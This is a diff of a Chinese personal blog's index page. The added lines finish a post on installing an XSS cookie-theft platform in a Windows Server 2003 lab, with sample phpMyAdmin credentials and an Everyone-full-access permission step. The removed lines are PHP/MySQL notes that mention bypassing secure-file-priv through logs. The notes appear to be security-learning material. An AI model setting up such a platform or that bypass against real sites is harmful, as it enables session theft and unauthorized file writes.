+<li>网站根目录 -&gt; config.php -&gt; 查看配置是否修改（urlroot等）</li>
+<li>物理机访问Window Server 2003的IP/index.php查看是否访问得到<ul>
+<li>可添加index.php为网站默认页，通过默认网站 -&gt; 属性 -&gt; 文档 -&gt; 添加 -&gt; index.php -&gt; 应用</li>
+<li>进行用户名，密码邮箱的注册，并登陆</li>
+</ul>
+</li>
+<li>创建XSS项目</li>
+<li>▲ 若无法盗取cookie，进行ISAPI_Rewrite3软件的安装<ul>
+<li>默认安装 -&gt; 开始 -&gt; Helicon -&gt; ISAPI_Rewrite3 -&gt; 默认站点 -&gt; 编辑 -&gt; 应用</li>
+</ul>
+</li>
+<li>▲ 邀请码模式<ul>
+<li>浏览器访问<a href="http://127.0.0.1:999（phpmyadmin）" target="_blank" rel="noopener">http://127.0.0.1:999（phpmyadmin）</a><ul>
+<li>用户名：root / 密码：zkeys</li>
+<li>点击oc_user表，修改刚新添加的用户的adminLevel级别为1</li>
+<li>执行</li>
+</ul>
+</li>
+<li>修改权限（网站根目录）<ul>
+<li>权限设置：shift所有的目录 -&gt; 右键 -&gt; 属性 -&gt; 安全 -&gt; 添加 -&gt; Everyone -&gt; 允许所有操作</li>
+<li>权限设置：shift所有的文件 -&gt; 右键 -&gt; 属性 -&gt; 安全 -&gt; 添加 -&gt; Everyone -&gt; 允许所有操作</li>
+<li>对网站根目录设置权限：右键 -&gt; 属性 -&gt; 安全 -&gt; 添加 -&gt; Everyone -&gt; 允许所有操作（▲ PHP需求）</li>
+</ul>
+</li>
+<li>浏览器访问<a href="http://Window" target="_blank" rel="noopener">http://Window</a> Server 2003的IP/index.php?do=user&amp;act=invite</li>
+<li>进行生成邀请码</li>
+<li>邀请码注册尝试</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
     <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/03/18/PHP%E5%AD%A6%E4%B9%A0-7%EF%BC%9Aphp%E5%B0%86%E6%95%B0%E7%BB%84%E5%86%99%E5%85%A5%E6%96%87%E4%BB%B6%E7%9A%84%E6%96%B9%E6%B3%95/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -2090,253 +3118,6 @@
 
 
     
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/03/13/PHP%E7%AC%94%E8%AE%B0-21%EF%BC%9A%E6%95%B0%E6%8D%AE%E5%BA%93%E4%B8%8EPHP%E6%93%8D%E4%BD%9C/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="Tomas">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/images/photo.jpg">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Tomas'Blog">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2020/03/13/PHP%E7%AC%94%E8%AE%B0-21%EF%BC%9A%E6%95%B0%E6%8D%AE%E5%BA%93%E4%B8%8EPHP%E6%93%8D%E4%BD%9C/" itemprop="url">PHP笔记-21：数据库与PHP操作</a></h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-03-13T12:59:39+08:00">
-                2020-03-13
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-            <span class="post-category" >
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">分类于</span>
-              
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/PHP/" itemprop="url" rel="index">
-                    <span itemprop="name">PHP</span>
-                  </a>
-                </span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-            <div class="post-wordcount">
-              
-                
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-file-word-o"></i>
-                </span>
-                
-                  <span class="post-meta-item-text">字数统计&#58;</span>
-                
-                <span title="字数统计">
-                  719 字
-                </span>
-              
-
-              
-                <span class="post-meta-divider">|</span>
-              
-
-              
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-clock-o"></i>
-                </span>
-                
-                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
-                
-                <span title="阅读时长">
-                  3 分钟
-                </span>
-              
-            </div>
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <hr>
-<h4 id="1-MySQL命令符"><a href="#1-MySQL命令符" class="headerlink" title="1. MySQL命令符"></a>1. MySQL命令符</h4><ul>
-<li>Mysqladmin 日常管理命令总结 或 重置密码</li>
-<li>Mysql 用到操作数据库</li>
-<li>Mysqld 用来开启MYSQL 或者 关闭</li>
-<li>Mysqlimport 数据库导入</li>
-</ul>
-<h4 id="2-MySQL操作"><a href="#2-MySQL操作" class="headerlink" title="2. MySQL操作"></a>2. MySQL操作</h4><ul>
-<li>登录MYSQL    mysql  -h 192.168.1.100 -u root -p -P 123<ul>
-<li>-h 你的IP</li>
-<li>-U 你的用户名</li>
-<li>-p你的密码 可不填 但是后面要填</li>
-<li>-P （大写） 端口号</li>
-</ul>
-</li>
-<li>常规操作<ul>
-<li>查看所有数据库：Show databases</li>
-<li>选择数据库之后 查看当前数据库所有的表：show tables;</li>
-<li>创建数据库：Create database 数据库名;</li>
-<li>选择数据库：use 数据库名;</li>
-<li>创建表跟字段<ul>
-<li>Create table admin2(</li>
-<li>Username varchar(20) not null,</li>
-<li>Passworld text not null);</li>
-</ul>
-</li>
-<li>查看表结构：desc 表名</li>
-<li>添加数据<ul>
-<li>Insert into 表名 values (“”);</li>
-<li>Insert into 表名 (字段名) values (“”);</li>
-</ul>
-</li>
-<li>查询数据库<ul>
-<li>Select * from 表名;</li>
-</ul>
-</li>
-<li>修改数据<ul>
-<li>Update 表名 set 字段 = ‘’;</li>
-</ul>
-</li>
-<li>清空表数据<ul>
-<li>Delete from 表名</li>
-</ul>
-</li>
-<li>删除表<ul>
-<li>Drop table 表名;</li>
-</ul>
-</li>
-<li>备份数据库<ul>
-<li>命令行备份<ul>
-<li>select * from 表名 into outfile ‘/tmp/1.txt’</li>
-<li>▲ 可能报错，需要修改–secure-file-priv的路径，可绕过–通过日志绕过</li>
-</ul>
-</li>
-<li>界面备份<ul>
-<li>从mysql的数据库路径/data，拷走所有的表结构以及表数据</li>
-</ul>
-</li>
-</ul>
-</li>
-<li>自增型<ul>
-<li>auto_increment</li>
-</ul>
-</li>
-<li>搜索关键字<ul>
-<li>select * from admin where username like “%%xindong”;</li>
-</ul>
-</li>
-<li>分页</li>
-</ul>
-</li>
-</ul>
-<h4 id="3-PHP操作MySQL数据库"><a href="#3-PHP操作MySQL数据库" class="headerlink" title="3. PHP操作MySQL数据库"></a>3. PHP操作MySQL数据库</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">    $lin = mysqli_connect(&apos;127.0.0.1&apos;,&apos;root&apos;,&apos;root&apos;);</span><br><span class="line"></span><br><span class="line">    //数据库使用--mysqli_query</span><br><span class="line"></span><br><span class="line">    mysqli_query($lin,&quot;use php_mysql_demo&quot;);  //选择数据库</span><br><span class="line">    mysqli_query($lin,&quot;set names utf8&quot;);  //设置数据库编码</span><br><span class="line"></span><br><span class="line">    mysqli_query($lin,&quot;insert into admin values (&apos;xindong&apos;,&apos;123&apos;)&quot;);  //添加数据库记录</span><br><span class="line">    mysqli_query($lin,&quot;delete from admin where username = &apos;1111&apos;&quot;);  //删除数据库记录</span><br><span class="line">    mysqli_query($lin,&quot;update admin set username = &apos;1111&apos;&quot;);  //修改数据</span><br><span class="line"></span><br><span class="line">    //数据库查询使用--mysqli_fetch_array</span><br><span class="line">    /*</span><br><span class="line">    mysqli_fetch_array()包含两个内容，默认的，函数可以通过第二个参数来设定返回的类型</span><br><span class="line">    1. MYSQLI_ASSOC：返回关联数组</span><br><span class="line">    2. MYSQLI_NUM：返回索引数组</span><br><span class="line">    3. MYSQLI_BOTH：默认的，两种数值都返回</span><br><span class="line">    */</span><br><span class="line"></span><br><span class="line">    $list = mysqli_query($lin,&quot;select * from admin&quot;);</span><br><span class="line">    $list_data = mysqli_fetch_array($list,MYSQLI_ASSOC);</span><br><span class="line">    var_dump($list_data);  //打印单行数据，指针默认从顶部开始</span><br><span class="line">    echo &quot;&lt;/br&gt;&quot;;</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">    //输出查询的整个数据库</span><br><span class="line">    $list1 = mysqli_query($lin,&quot;select * from admin&quot;);</span><br><span class="line">    $arr = array();</span><br><span class="line">    while($list1_data = mysqli_fetch_array($list1,MYSQLI_ASSOC))</span><br><span class="line">    &#123;</span><br><span class="line">        $arr[] = $list1_data;</span><br><span class="line">        //直接输出 var_dump($list1_data);</span><br><span class="line">    &#125;</span><br><span class="line">    var_dump($arr);  //打印整个数据</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">     /*</span><br><span class="line">    mysqli_errno()：出现错误的错误编号</span><br><span class="line">    mysqli_error()：错误信息</span><br><span class="line">    */</span><br><span class="line">    $lin1 = mysqli_connect(&apos;127.0.0.1&apos;,&apos;root&apos;,&apos;root&apos;);</span><br><span class="line">    $a = mysqli_query($lin,&quot;use demo11111&quot;);  //不存在的数据库</span><br><span class="line">    //mysqli_query($lin,&quot;set names utf8&quot;);</span><br><span class="line"></span><br><span class="line">    if(mysqli_errno($lin))</span><br><span class="line">    &#123;</span><br><span class="line">        echo &apos;&lt;/br&gt;&apos;;</span><br><span class="line">        echo mysqli_errno($lin);  //输出错误的编号</span><br><span class="line">        echo &apos;&lt;/br&gt;&apos;; </span><br><span class="line">        echo mysqli_error($lin);  //输出错误信息</span><br><span class="line">    &#125;</span><br><span class="line">    echo &apos;&lt;/br&gt;&apos;;</span><br><span class="line"></span><br><span class="line">    //数据库的行数</span><br><span class="line">    /*</span><br><span class="line">    mysqli_data_seek()：用来设置结果集指针的位置</span><br><span class="line">    mysqli_num_row()：取得结果集的长度（记录的个数）</span><br><span class="line">    */</span><br><span class="line">    $lin2 = mysqli_connect(&apos;127.0.0.1&apos;,&apos;root&apos;,&apos;root&apos;);</span><br><span class="line">    $b = mysqli_query($lin2,&quot;use php_mysql_demo&quot;); </span><br><span class="line"></span><br><span class="line">    $list2 = mysqli_query($lin2,&quot;select * from admin&quot;);</span><br><span class="line"></span><br><span class="line">    echo mysqli_num_rows($list2);</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
-
-
-
-          
-        
-      
-    </div>
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
   </section>
 
   
@@ -2391,7 +3172,7 @@
               
                 <a href="/archives/">
               
-                  <span class="site-state-item-count">168</span>
+                  <span class="site-state-item-count">169</span>
                   <span class="site-state-item-name">日志</span>
                 </a>
               </div>
@@ -2402,7 +3183,7 @@
               
               <div class="site-state-item site-state-categories">
                 <a href="/categories/index.html">
-                  <span class="site-state-item-count">6</span>
+                  <span class="site-state-item-count">7</span>
                   <span class="site-state-item-name">分类</span>
                 </a>
               </div>
@@ -2413,7 +3194,7 @@
               
               <div class="site-state-item site-state-tags">
                 <a href="/tags/index.html">
-                  <span class="site-state-item-count">8</span>
+                  <span class="site-state-item-count">10</span>
                   <span class="site-state-item-name">标签</span>
                 </a>
               </div>
@@ -2498,7 +3279,7 @@
     
       <span class="post-meta-item-text">Site words total count&#58;</span>
     
-    <span title="Site words total count">152.4k</span>
+    <span title="Site words total count">160.9k</span>
   
 </div>
 
